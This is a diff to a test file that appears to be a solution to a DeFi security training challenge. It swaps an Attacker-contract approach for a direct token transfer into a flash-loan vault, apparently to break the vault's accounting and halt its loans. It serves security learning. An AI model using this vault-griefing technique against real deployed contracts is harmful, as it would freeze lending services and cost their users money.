@@ -91,10 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        Attacker attacker = new Attacker(address(vault), address(token));
-        token.transfer(address(attacker), token.balanceOf(player));
-        console.log(token.balanceOf(address(attacker)));
-        attacker.attackLoan();
+        //Attacker attacker = new Attacker(address(vault), address(token));
+        token.transfer(address(vault), token.balanceOf(player));
+        //console.log(token.balanceOf(address(attacker)));
+
     }
 
     /**
